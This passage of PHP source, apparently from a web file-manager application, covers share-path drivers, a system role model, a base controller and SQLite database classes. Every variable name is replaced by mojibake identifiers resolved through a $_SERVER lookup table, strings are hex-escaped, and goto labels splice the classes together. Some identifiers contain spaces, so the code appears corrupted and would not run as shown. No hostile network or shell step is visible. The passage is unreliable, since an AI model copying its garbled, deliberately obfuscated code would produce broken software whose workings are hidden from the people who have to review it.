$ëªñéº®[$Ä±µõ[243]] : $ëªñéº®[$Ä±µõ[242]]; } public function listAll($øÏíö®–) { $ç™œÊ’ = IO::info($this->pathParse[$_SERVER[´‹ô¯Œ][87]]); if (!$ç™œÊ’) { return array(); } return $this->model->listAll($øÏíö®–); } public function getContent($ê¦Ò¥ß¬) { return $this->model->getContent($ê¦Ò¥ß¬); } public function setContent($¦•È£¾¼, $×‚‘•¸© = '') { return $this->model->setContent($¦•È£¾¼, $×‚‘•¸©); } public function fileSubstr($ä°©ß¨, $¬¬üÛ“ø, $å­Û‰ÊÃ) { return $this->model->fileSubstr($ä°©ß¨, $¬¬üÛ“ø, $å­Û‰ÊÃ); } public function download($­ğ³¤º°, $¥×Ş¥ß¤ = '') { $˜±úì†¥ = get_path_father($¥×Ş¥ß¤); $ñÄÜÄã¨ = get_path_this($¥×Ş¥ß¤); $ØŸü§Á = $this->model->fileInfoGet($­ğ³¤º°); $€»¢û§ = IO::copy($ØŸü§Á[$_SERVER[´‹ô¯Œ][87]], $˜±úì†¥, !1, $ñÄÜÄã¨); return $€»¢û§; } public function setModifyTime($ÄÍÔ‰ø, $»Û±ŸÆ = '') { $û›—‘ =& $_SERVER[´‹ô¯Œ]; if (!$ÄÍÔ‰ø) { return; } $this->model->where(array($û›—‘[503] => $ÄÍÔ‰ø))->save(array($û›—‘[88] => $»Û±ŸÆ)); } public function upload($¸ëŠË¾£, $õà«³§ì, $ÁúáÒ¢ = false, $¾áÕ ÔÃ = REPEAT_REPLACE) { $¾¤â¤¹Ç =& $_SERVER[´‹ô¯Œ]; $û•öÂ° = $this->parse($¸ëŠË¾£); $¥¦’Šë = $this->model->addFile($û•öÂ°[$¾¤â¤¹Ç[487]], $õà«³§ì, $û•öÂ°[$¾¤â¤¹Ç[87]], $ÁúáÒ¢, $¾áÕ ÔÃ); return $this->getPathOuter($¥¦’Šë); } public function uploadFileByID($ÌŸÛÔÎŠ, $İ¯Æ€ÈÕ, $Ø¯’íÏ) { $˜şùëË¸ =& $_SERVER[´‹ô¯Œ]; $à”÷ë‡ = $this->parse($ÌŸÛÔÎŠ); $Šİ´Ğ¸¥ = $this->model->addFileByFileID($à”÷ë‡[$˜şùëË¸[487]], $İ¯Æ€ÈÕ, $à”÷ë‡[$˜şùëË¸[87]], $Ø¯’íÏ); return $this->getPathOuter($Šİ´Ğ¸¥); } public function addFileByRemote($ª §ığ¼, $åÙ±ùÍ, $‹»¶¦€ = array(), $ÖµØØ­ = '', $ÓßÆ¹¤¹) { $©€ò³™ =& $_SERVER[´‹ô¯Œ]; $¡¾ÌŸ†Ä = $this->parse($ª §ığ¼); $ÖµØØ­ = empty($ÖµØØ­) ? $¡¾ÌŸ†Ä[$©€ò³™[87]] : $ÖµØØ­; $¿¿µèÖ† = $this->model->addFileByRemote($¡¾ÌŸ†Ä[$©€ò³™[487]], $åÙ±ùÍ, $ÖµØØ­, $‹»¶¦€, $ÓßÆ¹¤¹); return $this->getPathOuter($¿¿µèÖ†); } public function uploadLink($÷’Á—öá, $˜†È¢òÓ = 0) { $Ïø„¢¢½ =& $_SERVER[´‹ô¯Œ]; $Ìû¾ä‰ = $this->parse($÷’Á—öá); $¾»¨í¼¯ = _get($GLOBALS[$Ïø„¢¢½[7]], $Ïø„¢¢½[1447]); $²´Ö„› = _get($GLOBALS[$Ïø„¢¢½[7]], $Ïø„¢¢½[1448]); $Í‡¾§ÑÅ = KodIO::ioFileDriverGet($Ïø„¢¢½[495] . $Ìû¾ä‰[$Ïø„¢¢½[487]] . $Ïø„¢¢½[405]); $á‡åƒô¦ = Model($Ïø„¢¢½[691])->createFileName($Ìû¾ä‰[$Ïø„¢¢½[87]], $Í‡¾§ÑÅ, $¾»¨í¼¯, $²´Ö„›); return IO::uploadLink($á‡åƒô¦, $˜†È¢òÓ); } public function fileNameAuto($¡ıö’È , $îØÆÊ÷¨, $ÃÛ†Ä§Ñ = REPEAT_REPLACE, $Šñîœ = false) { return $this->model->fileNameAuto($¡ıö’È , $îØÆÊ÷¨, $ÃÛ†Ä§Ñ, $Šñîœ); } public function fileNameExist($œ•Øá…², $úÏšííÆ) { return $this->model->fileNameExist($œ•Øá…², $úÏšííÆ); } protected function _fileOut($ğÅÈå®, $ª ‹úˆğ = false, $—şÑİ¬” = false, $¶¦‚£×È = '', $Œ†ôÄîø = false) { $Íì¿Û¯• =& $_SERVER[´‹ô¯Œ]; $Ù÷ô¥å° = $this->model->sourceInfo($ğÅÈå®); if ($Ù÷ô¥å°[$Íì¿Û¯•[497]] == $Íì¿Û¯•[91]) { header($Íì¿Û¯•[1449]); die; } $½·§úˆÒ = $this->model->fileInfoGet($ğÅÈå®); $¶¦‚£×È = $½·§úˆÒ[$Íì¿Û¯•[561]] ? $½·§úˆÒ[$Íì¿Û¯•[561]] : $¶¦‚£×È; $­‚³¼Ï³ = isset($GLOBALS[$Íì¿Û¯•[183]]) && is_array($GLOBALS[$Íì¿Û¯•[183]]) ? $GLOBALS[$Íì¿Û¯•[183]][$Íì¿Û¯•[32]] : $Ù÷ô¥å°[$Íì¿Û¯•[32]]; if ($Œ†ôÄîø) { return IO::fileOutServer($½·§úˆÒ[$Íì¿Û¯•[87]], $ª ‹úˆğ, $­‚³¼Ï³, $¶¦‚£×È); } IO::fileOut($½·§úˆÒ[$Íì¿Û¯•[87]], $ª ‹úˆğ, $­‚³¼Ï³, $¶¦‚£×È); } public function fileOut($çËë’—ö, $’ª·¬î„ = false, $´ƒºÈ½ = false, $Ÿåè–Şó = '') { $this->_fileOut($çËë’—ö, $’ª·¬î„, $´ƒºÈ½, $Ÿåè–Şó); } public function fileOutServer($›êé„§Å, $Å¿Õ¬«˜ = false, $²¸³·óÇ = false, $ä°™‰Á¦ = '') { $this->_fileOut($›êé„§Å, $Å¿Õ¬«˜, $²¸³·óÇ, $ä°™‰Á¦, !0); } protected function _fileOutImage($Üë‘ˆš, $Œ××Îã– = 250) { $íóûÑ‚ê =& $_SERVER[´‹ô¯Œ]; $ğ­àÏ• = $this->model->pathInfo($Üë‘ˆš); if ($ğ­àÏ•[$íóûÑ‚ê[497]] == $íóûÑ‚ê[91]) { show_json($íóûÑ‚ê[1450] . $Üë‘ˆš, !1); } $–ÅÓÌ€ = $this->model->fileInfoGet($Üë‘ˆš); $ğ­àÏ•[$íóûÑ‚ê[184]] = $–ÅÓÌ€[$íóûÑ‚ê[87]]; $GLOBALS[$íóûÑ‚ê[183]] = $ğ­àÏ•; IO::fileOutImage($–ÅÓÌ€[$íóûÑ‚ê[87]], $Œ××Îã–); } public function fileOutImage($³ëõ²Î¦, $›©ÃŠ = 250) { $this->_fileOutImage($³ëõ²Î¦, $›©ÃŠ); } public function fileOutImageServer($‚íÁËßÁ, $ì‚ÊØ Ù = 250) { $this->_fileOutImage($‚íÁËßÁ, $ì‚ÊØ Ù); } public function link($«ÃÓŒ‹Î, $å”¯âÌ = '') { $´„æ™¼á = $this->model->fileInfoGet($«ÃÓŒ‹Î); return IO::link($´„æ™¼á[$_SERVER[´‹ô¯Œ][87]], $å”¯âÌ); } protected function parse($¿’ñÍ‰¯) { $ÊÛ÷è¦å =& $_SERVER[´‹ô¯Œ]; if (strstr($¿’ñÍ‰¯, $ÊÛ÷è¦å[8]) === !1) { return array($ÊÛ÷è¦å[505] => intval($¿’ñÍ‰¯), $ÊÛ÷è¦å[87] => $ÊÛ÷è¦å[12], $ÊÛ÷è¦å[1446] => array()); } $ØÃô¶¢ø = explode($ÊÛ÷è¦å[8], trim($¿’ñÍ‰¯, $ÊÛ÷è¦å[8])); if (count($ØÃô¶¢ø) < 2) { show_tips(clear_html($¿’ñÍ‰¯) . $ÊÛ÷è¦å[1451]); } return array($ÊÛ÷è¦å[505] => intval($ØÃô¶¢ø[0]), $ÊÛ÷è¦å[87] => $ØÃô¶¢ø[1], $ÊÛ÷è¦å[1446] => array_slice($ØÃô¶¢ø, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Ûü¢ëòÁ) { $this->pathParse = $Ûü¢ëòÁ; $this->model = Model($_SERVER[´‹ô¯Œ][1445]); } public function getPathOuter($ŞÉÆÉ) { $ªú’ÍÃÉ =& $_SERVER[´‹ô¯Œ]; if (!$ŞÉÆÉ) { return $ŞÉÆÉ; } $ªÉÀÇåÆ = $this->parse($ŞÉÆÉ); return trim(KodIO::makeShare($this->pathParse[$ªú’ÍÃÉ[487]], $ªÉÀÇåÆ[$ªú’ÍÃÉ[487]]), $ªú’ÍÃÉ[8]); } protected function infoParse($¶¤å†ĞÙ, $˜¯‚ù = false, $§ìŸüÌ­ = false) { $¡‘“³ =& $_SERVER[´‹ô¯Œ]; $îê’ÈÑ = $this->pathParse[$¡‘“³[487]]; $ğ°êÚÌ· = trim($this->pathParse[$¡‘“³[1266]], $¡‘“³[8]); return Action($¡‘“³[1452])->sharePathInfo($îê’ÈÑ, $ğ°êÚÌ·, $˜¯‚ù); } public function infoFull($®½ü‰·Ú) { $î£¼òö¥ =& $_SERVER[´‹ô¯Œ]; $ÃÁğ‡µÙ = explode($î£¼òö¥[8], trim($®½ü‰·Ú, $î£¼òö¥[8])); if (count($ÃÁğ‡µÙ) > 1) { $¶ë‘‡áÛ = implode($î£¼òö¥[8], array_splice($ÃÁğ‡µÙ, 1)); $€÷‰¢Â = $this->model->pathInfoByPath($ÃÁğ‡µÙ[0], $¶ë‘‡áÛ); if (!$€÷‰¢Â) { return !1; } $this->pathParse[$î£¼òö¥[1266]] = $€÷‰¢Â[$î£¼òö¥[194]]; } return $this->infoParse($®½ü‰·Ú); } public function listAll($õ»‰¬º¥) { $ÆóÓŠÏÚ =& $_SERVER[´‹ô¯Œ]; $¢¤ÉÙÆ = IO::info($this->pathParse[$ÆóÓŠÏÚ[87]]); if (!$¢¤ÉÙÆ) { return array(); } $òî’şò = $this->model->listAll($õ»‰¬º¥); $“¡›²Ù = Model($ÆóÓŠÏÚ[681])->getInfo($¢¤ÉÙÆ[$ÆóÓŠÏÚ[682]]); foreach ($òî’şò as &$¬¼ºôÖ) { check_abort(); $¬¼ºôÖ[$ÆóÓŠÏÚ[90]] = Action($ÆóÓŠÏÚ[1452])->_shareItemeParse($¬¼ºôÖ[$ÆóÓŠÏÚ[90]], $“¡›²Ù); } unset($¬¼ºôÖ); return $òî’şò; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ÅÅÔ´ºç) { $this->pathParse = $ÅÅÔ´ºç; $this->model = Model($_SERVER[´‹ô¯Œ][1445]); } protected function infoParse($Ô Î…ù€, $–ÒÇÑÉè = false, $ëé§äÊ¨ = false) { $©Š¬°ª³ =& $_SERVER[´‹ô¯Œ]; return Action($©Š¬°ª³[1273])->sharePathInfo($this->pathParse[$©Š¬°ª³[87]], !0, $–ÒÇÑÉè); } public function listPath($²¾×˜—Ä, $ı˜×¦¤ = false) { $ëÏ¡ïÃ— =& $_SERVER[´‹ô¯Œ]; $¥øÒòÓå = parent::listPath($²¾×˜—Ä, $ı˜×¦¤); if (!$¥øÒòÓå) { return $¥øÒòÓå; } if (is_array($¥øÒòÓå[$ëÏ¡ïÃ—[1453]])) { $¥øÒòÓå[$ëÏ¡ïÃ—[1453]] = Action($ëÏ¡ïÃ—[1273])->shareItemInfo($¥øÒòÓå[$ëÏ¡ïÃ—[1453]]); } foreach ($¥øÒòÓå as $¬±œëüÇ => $ãıõÜŸ) { if (!in_array($¬±œëüÇ, array($ëÏ¡ïÃ—[86], $ëÏ¡ïÃ—[85]))) { continue; } foreach ($ãıõÜŸ as $ŒŒ…õÇİ => $œ§æÍÌ) { $¥øÒòÓå[$¬±œëüÇ][$ŒŒ…õÇİ] = Action($ëÏ¡ïÃ—[1273])->shareItemInfo($œ§æÍÌ); } } return $¥øÒòÓå; } public function listAll($œšÓéâø) { $àúßŞÆÊ =& $_SERVER[´‹ô¯Œ]; $„¾èâş© = IO::info($this->pathParse[$àúßŞÆÊ[87]]); if (!$„¾èâş©) { return array(); } $Ã’º‘È€ = $this->model->listAll($œšÓéâø); foreach ($Ã’º‘È€ as &$óüÖ¿ÍĞ) { $óüÖ¿ÍĞ[$àúßŞÆÊ[90]] = Action($àúßŞÆÊ[1273])->shareItemInfo($óüÖ¿ÍĞ[$àúßŞÆÊ[90]]); } unset($óüÖ¿ÍĞ); return $Ã’º‘È€; } } goto eªĞŒ¸Éİš; F¨èÛÑÊÁ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\155\x5f\157\x70\x74\x69\x6f\156"; protected $jsonField = array("\x6d\x65\x6e\165", "\162\157\154\x65", "\162\x6f\x6c\x65\x47\162\157\165\x70", "\x72\x65\x67\x69\x73\164", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($Ìûó Ş) { return "\x53\x79\x73\164\x65\155\x4f\x70\164\151\x6f\156\137{$Ìûó Ş}"; } protected function optionDefault($°Ñï = '') { $¨Á…ÏÀ =& $_SERVER[´‹ô¯Œ]; if ($°Ñï == $¨Á…ÏÀ[12]) { return $GLOBALS[$¨Á…ÏÀ[6]][$¨Á…ÏÀ[460]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\162\157\154\x65\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\141\165\x74\150", "\154\141\142\x65\154", "\144\x69\163\160\x6c\x61\x79", "\163\171\163\164\x65\155", "\x64\145\163\143", "\x69\147\x6e\157\x72\145\x45\x78\x74", "\151\x67\156\x6f\162\145\106\151\x6c\145\x53\151\172\x65", "\141\x64\155\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\162", "\163\x6f\162\x74"); public function listData($ŞÊŠŸ¿ = false, $ÖÂ‘×ßÃ = "\163\157\x72\164", $×ŞÉë¾¯ = false) { $¼¸¿ÍàË =& $_SERVER[´‹ô¯Œ]; $Äû—¹— = parent::listData($ŞÊŠŸ¿, $ÖÂ‘×ßÃ, $×ŞÉë¾¯); if (!$ŞÊŠŸ¿) { foreach ($Äû—¹— as $æ»€Ï«¥ => $åÆÅƒä¶) { if ($åÆÅƒä¶[$¼¸¿ÍàË[2205]] == 1) { $Äû—¹—[$æ»€Ï«¥][$¼¸¿ÍàË[538]] = LNG($¼¸¿ÍàË[2480]); } } } return $Äû—¹—; } public function update($·øÀú›¶, $İÒ¶´ù¬) { $Ìõóİåı =& $_SERVER[´‹ô¯Œ]; $æìßó¿ = parent::listData($·øÀú›¶); $ÇºËÚÅĞ = $this->findByName($İÒ¶´ù¬[$Ìõóİåı[32]]); if (!$æìßó¿ || $ÇºËÚÅĞ && $ÇºËÚÅĞ[$Ìõóİåı[487]] != $æìßó¿[$Ìõóİåı[487]]) { return !1; } if ($ÇºËÚÅĞ[$Ìõóİåı[2205]] == 1) { $İÒ¶´ù¬ = array($Ìõóİåı[32] => $İÒ¶´ù¬[$Ìõóİåı[32]], $Ìõóİåı[2019] => $İÒ¶´ù¬[$Ìõóİåı[2019]]); } $this->filterAuth($İÒ¶´ù¬[$Ìõóİåı[499]]); return parent::update($·øÀú›¶, $İÒ¶´ù¬); } public function remove($ò¦öÛ·ä) { $›Ú›»µÓ = parent::listData($ò¦öÛ·ä); if (!$›Ú›»µÓ || $›Ú›»µÓ[$_SERVER[´‹ô¯Œ][192]]) { return !1; } return parent::remove($ò¦öÛ·ä); } public function add($¹”µáèÌ) { $¦ùƒíù£ =& $_SERVER[´‹ô¯Œ]; $ÆğÌ·âù = $¹”µáèÌ[$¦ùƒíù£[32]]; if ($this->findByName($ÆğÌ·âù)) { return !1; } $ô®ƒ„å™ = array($¦ùƒíù£[506] => $ÆğÌ·âù, $¦ùƒíù£[2002] => $¦ùƒíù£[12], $¦ùƒíù£[1998] => $¦ùƒíù£[2006], $¦ùƒíù£[2481] => 1, $¦ùƒíù£[2001] => 0, $¦ùƒíù£[2482] => 0, $¦ùƒíù£[2000] => $this->getSort()); $¹”µáèÌ = array_merge($ô®ƒ„å™, $¹”µáèÌ); $this->filterAuth($¹”µáèÌ[$¦ùƒíù£[499]]); return parent::insert($¹”µáèÌ); } private function getSort() { $‘ÎÁã¯å =& $_SERVER[´‹ô¯Œ]; $ğóµâÕ = parent::listData(); $ÓÎ§á™Á = array_to_keyvalue($ğóµâÕ, $‘ÎÁã¯å[12], $‘ÎÁã¯å[2020]); return empty($ÓÎ§á™Á) ? 0 : max($ÓÎ§á™Á) + 1; } private function filterAuth(&$ˆ¿È»Ã²) { $ú©¡³Äø =& $_SERVER[´‹ô¯Œ]; $¾şûÈä÷ = array(); $õ»Ç¦é¡ = array_filter(explode($ú©¡³Äø[50], $ˆ¿È»Ã²)); foreach ($õ»Ç¦é¡ as $ˆ¿È»Ã²) { $ô”ë«¹ì = explode($ú©¡³Äø[10], $ˆ¿È»Ã²); if ($ô”ë«¹ì[0] == $ú©¡³Äø[2483] && $ô”ë«¹ì[1] != $ú©¡³Äø[1292]) { $¾Ó”Ò”· = $ô”ë«¹ì[0] . $ú©¡³Äø[10] . $ô”ë«¹ì[1] . $ú©¡³Äø[2484]; if (!in_array($¾Ó”Ò”·, $õ»Ç¦é¡)) { $¾şûÈä÷[] = $¾Ó”Ò”·; } } $¾şûÈä÷[] = $ˆ¿È»Ã²; } $ˆ¿È»Ã² = implode($ú©¡³Äø[50], $¾şûÈä÷); } public function findRoleDefault() { $Ó¸€öàá =& $_SERVER[´‹ô¯Œ]; $¶¶¯èÑ = parent::listData(); $†éœè“Ğ = !1; foreach ($¶¶¯èÑ as $Íõ¸Ñ) { if (!$Íõ¸Ñ || $Íõ¸Ñ[$Ó¸€öàá[2018]] == $Ó¸€öàá[231] || $Íõ¸Ñ[$Ó¸€öàá[2205]] == 1) { continue; } if (strstr($Íõ¸Ñ[$Ó¸€öàá[499]], $Ó¸€öàá[2485])) { continue; } if (!strstr($Íõ¸Ñ[$Ó¸€öàá[499]], $Ó¸€öàá[2486])) { continue; } if (!$†éœè“Ğ) { $†éœè“Ğ = $Íõ¸Ñ; continue; } $†ˆ˜Â” = explode($Ó¸€öàá[50], $†éœè“Ğ[$Ó¸€öàá[499]]); $ı™Ë™€ä = explode($Ó¸€öàá[50], $Íõ¸Ñ[$Ó¸€öàá[499]]); if (count($†ˆ˜Â”) > count($ı™Ë™€ä)) { $†éœè“Ğ = $Íõ¸Ñ; } } return $†éœè“Ğ ? $†éœè“Ğ[$Ó¸€öàá[487]] : $Ó¸€öàá[12]; } public function sort($è’Ò“Ö‚, $¬ÖüØã) { return parent::update($è’Ò“Ö‚, $¬ÖüØã); } } goto AÍ‹ªÍ…Š; fáøäâùë§: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $È‡éÌœµ =& $_SERVER[´‹ô¯Œ]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$È‡éÌœµ[6]] =& $config; $this->values[$È‡éÌœµ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $È‡éÌœµ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ãşë’¿ƒ) { if (1 === func_num_args()) { $this->{$ãşë’¿ƒ} = new $ãşë’¿ƒ(); } else { $µ£Ô€·„ = new ReflectionClass($ãşë’¿ƒ); $˜›¼ŞŠ˜ = func_get_args(); array_shift($˜›¼ŞŠ˜); $this->{$ãşë’¿ƒ} = $µ£Ô€·„->newInstanceArgs($˜›¼ŞŠ˜); } return $this->{$ãşë’¿ƒ}; } public function routeBind($•×Ø“ù‡, $´öƒı°ç, $´ÑîâÎ‚ = 3) { $Ç£æïà¬ =& $_SERVER[´‹ô¯Œ]; $…ı›Ù²× = $this->in[$Ç£æïà¬[9]]; $•×Ø“ù‡ = str_replace($Ç£æïà¬[10], $Ç£æïà¬[11], trim(trim($•×Ø“ù‡, $Ç£æïà¬[8]), $Ç£æïà¬[12])); if (!$•×Ø“ù‡ || count($…ı›Ù²×) <= $´ÑîâÎ‚) { return !1; } $üÛÓÕµ¥ = !0; $ì¢ö£ü¦ = explode($Ç£æïà¬[8], $•×Ø“ù‡); for ($£†åšØ = 0; $£†åšØ < count($ì¢ö£ü¦); $£†åšØ++) { if ($ì¢ö£ü¦[$£†åšØ] != $…ı›Ù²×[$´ÑîâÎ‚ + $£†åšØ]) { $üÛÓÕµ¥ = !1; break; } } if (!$üÛÓÕµ¥) { return; } call_user_func_array(array($this, $´öƒı°ç), array()); } public function routeArgs($§‘àÎÙ† = 3) { $¶ÉùŒÑ = $this->in[$_SERVER[´‹ô¯Œ][9]]; if (count($¶ÉùŒÑ) <= $§‘àÎÙ†) { return array(); } $óÓÌ•İ = array(); for ($Ê’ƒ¦·ë = $§‘àÎÙ†; $Ê’ƒ¦·ë < count($¶ÉùŒÑ); $Ê’ƒ¦·ë += 2) { $óÓÌ•İ[$¶ÉùŒÑ[$Ê’ƒ¦·ë]] = $¶ÉùŒÑ[$Ê’ƒ¦·ë + 1]; $this->in[$¶ÉùŒÑ[$Ê’ƒ¦·ë]] = $¶ÉùŒÑ[$Ê’ƒ¦·ë + 1]; } return $óÓÌ•İ; } protected function assign($»†ÇÎµö, $Í ×áÅ) { $this->values[$»†ÇÎµö] = $Í ×áÅ; } protected function display($¡™ş‡¯) { ob_end_clean(); extract($this->values); require $this->tpl . $¡™ş‡¯; } } class DbSqliteBase extends Db { public function __construct($İüúåş = '') { $‚¯“á¤ù =& $_SERVER[´‹ô¯Œ]; if (!extension_loaded($‚¯“á¤ù[13])) { think_exception(think_lang($‚¯“á¤ù[14]) . $‚¯“á¤ù[15]); } if (!empty($İüúåş)) { if (!isset($İüúåş[$‚¯“á¤ù[16]])) { $İüúåş[$‚¯“á¤ù[16]] = 438; } $this->config = $İüúåş; if (empty($this->config[$‚¯“á¤ù[17]])) { $this->config[$‚¯“á¤ù[17]] = array(); } } } public function connect($ÈÊŸµá¸ = '', $¢®Øİ÷« = 0) { $â¹¤ƒ¶¥ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->linkID[$¢®Øİ÷«])) { if (empty($ÈÊŸµá¸)) { $ÈÊŸµá¸ = $this->config; } $°‰ÔÆÆÑ = !empty($ÈÊŸµá¸[$â¹¤ƒ¶¥[17]][$â¹¤ƒ¶¥[18]]) ? $ÈÊŸµá¸[$â¹¤ƒ¶¥[17]][$â¹¤ƒ¶¥[18]] : $this->pconnect; $·¼ó¢ŠÀ = $°‰ÔÆÆÑ ? $â¹¤ƒ¶¥[19] : $â¹¤ƒ¶¥[20]; $this->linkID[$¢®Øİ÷«] = $·¼ó¢ŠÀ($ÈÊŸµá¸[$â¹¤ƒ¶¥[21]], $ÈÊŸµá¸[$â¹¤ƒ¶¥[16]]); if (!$this->linkID[$¢®Øİ÷«]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¢®Øİ÷«], 30000); if (1 != think_config($â¹¤ƒ¶¥[22])) { unset($this->config); } } return $this->linkID[$¢®Øİ÷«]; } public function free() { $this->queryID = null; } public function query($„ÁáÂ¾‰) { $´¦—¹± =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $„ÁáÂ¾‰; if ($this->queryID) { $this->free(); } think_action_status($´¦—¹±[23], 1); think_status($´¦—¹±[24]); $this->queryID = sqlite_query($this->_linkID, $„ÁáÂ¾‰); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ÇÁı¶ï = $this->getAll(); return $ÇÁı¶ï; } } public function execute($‡ÔÀÅ‚) { $Ä‰ âà‚ =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡ÔÀÅ‚; if ($this->queryID) { $this->free(); } think_action_status($Ä‰ âà‚[25], 1); think_status($Ä‰ âà‚[24]); $Ãç°²¶š = sqlite_exec($this->_linkID, $‡ÔÀÅ‚); $this->debug(); if (!1 === $Ãç°²¶š) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[´‹ô¯Œ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $óà¬§Ùç = sqlite_query($this->_linkID, $_SERVER[´‹ô¯Œ][27]); if (!$óà¬§Ùç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Û•›¢óó = sqlite_query($this->_linkID, $_SERVER[´‹ô¯Œ][28]); if (!$Û•›¢óó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¹Áò©úá = array(); if ($this->numRows > 0) { for ($¸Œ™·Òù = 0; $¸Œ™·Òù < $this->numRows; $¸Œ™·Òù++) { $¹Áò©úá[$¸Œ™·Òù] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¹Áò©úá; } public function getFields($îÃ¥‹­ş) { $ª‚Îİ“ï =& $_SERVER[´‹ô¯Œ]; $Ëá·êş = $this->query($ª‚Îİ“ï[29] . $îÃ¥‹­ş . $ª‚Îİ“ï[30]); $û ‡»ğ = array(); if ($Ëá·êş) { foreach ($Ëá·êş as $ÜŸŠöÛ => $±¼€ã¸¥) { $û ‡»ğ[$±¼€ã¸¥[$ª‚Îİ“ï[31]]] = array($ª‚Îİ“ï[32] => $±¼€ã¸¥[$ª‚Îİ“ï[31]], $ª‚Îİ“ï[33] => $±¼€ã¸¥[$ª‚Îİ“ï[34]], $ª‚Îİ“ï[35] => (bool) ($±¼€ã¸¥[$ª‚Îİ“ï[36]] === $ª‚Îİ“ï[12]), $ª‚Îİ“ï[37] => $±¼€ã¸¥[$ª‚Îİ“ï[38]], $ª‚Îİ“ï[39] => strtolower($±¼€ã¸¥[$ª‚Îİ“ï[40]]) == $ª‚Îİ“ï[41], $ª‚Îİ“ï[42] => strtolower($±¼€ã¸¥[$ª‚Îİ“ï[43]]) == $ª‚Îİ“ï[44]); } } return $û ‡»ğ; } public function getTables($İ–ËğÀ = '') { $Ãº»Öò =& $_SERVER[´‹ô¯Œ]; $¢ÈàÜ¶ã = $this->query($Ãº»Öò[45] . $Ãº»Öò[46] . $Ãº»Öò[47]); $åæ·ë¥­ = array(); foreach ($¢ÈàÜ¶ã as $´à»¡å => $°’Øä¨­) { $åæ·ë¥­[$´à»¡å] = current($°’Øä¨­); } return $åæ·ë¥­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÚŠÜªÂÑ =& $_SERVER[´‹ô¯Œ]; $êä•±—Ê = sqlite_last_error($this->_linkID); $this->error = $êä•±—Ê . $ÚŠÜªÂÑ[4] . sqlite_error_string($êä•±—Ê); if ($ÚŠÜªÂÑ[12] != $this->queryStr) { $this->error .= LNG($ÚŠÜªÂÑ[48]) . $this->queryStr; } think_trace($this->error, $ÚŠÜªÂÑ[12], $ÚŠÜªÂÑ[49]); return $this->error; } public function escapeString($šŒ”îş) { return sqlite_escape_string($šŒ”îş); } public function parseLimit($äÜ­À) { $”©¢‚ =& $_SERVER[´‹ô¯Œ]; $ç¼ø¡’¦ = $”©¢‚[12]; if (!empty($äÜ­À)) { $äÜ­À = explode($”©¢‚[50], $äÜ­À); if (count($äÜ­À) > 1) { $ç¼ø¡’¦ .= $”©¢‚[51] . $äÜ­À[1] . $”©¢‚[52] . $äÜ­À[0] . $”©¢‚[53]; } else { $ç¼ø¡’¦ .= $”©¢‚[51] . $äÜ­À[0] . $”©¢‚[53]; } } return $ç¼ø¡’¦; } } class DbSqlite3Base extends Db { public function __construct($ğ…ÀáÎ  = '') { $ÒßñƒÊ— =& $_SERVER[´‹ô¯Œ]; if (!class_exists($ÒßñƒÊ—[54])) { think_exception(think_lang($ÒßñƒÊ—[14]) . $ÒßñƒÊ—[55]); } if (!empty($ğ…ÀáÎ )) { if (!isset($ğ…ÀáÎ [$ÒßñƒÊ—[16]])) { $ğ…ÀáÎ [$ÒßñƒÊ—[16]] = 438; } $this->config = $ğ…ÀáÎ ; if (empty($this->config[$ÒßñƒÊ—[17]])) { $this->config[$ÒßñƒÊ—[17]] = array(); } } } public function connect($Âõ—Ï = '', $ÖÇ®•ÁÊ = 0) { $»ğ€ÁÒ¼ =& $_SERVER[´‹ô¯Œ]; if (!isset($this->linkID[$ÖÇ®•ÁÊ])) { if (empty($Âõ—Ï)) { $Âõ—Ï = $this->config; } $this->linkID[$ÖÇ®•ÁÊ] = new SQLite3($Âõ—Ï[$»ğ€ÁÒ¼[21]]); if (!$this->linkID[$ÖÇ®•ÁÊ]) { think_exception($this->linkID[$ÖÇ®•ÁÊ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ÖÇ®•ÁÊ]->busyTimeout(30000); if (1 != think_config($»ğ€ÁÒ¼[22])) { unset($this->config); } } return $this->linkID[$ÖÇ®•ÁÊ]; } public function free() { $this->queryID = null; } public function query($‘š²Â²) { $Š¯ÖÍ°ß =& $_SERVER[´‹ô¯Œ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‘š²Â²; if ($this->queryID) { $this->free(); } think_action_status($Š¯ÖÍ°ß[23], 1); think_status($Š¯ÖÍ°ß[24]); $this->queryID = $this->_linkID->query($‘š²Â²); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $¯Ñ±Õ„× = $this->getAll(); $this->numRows = count($¯Ñ±Õ„×); return $¯Ñ±Õ„×; } } public function execute($ˆôÛßğ) { $²Öò¨ =& $_SERVER[´‹ô¯Œ]; 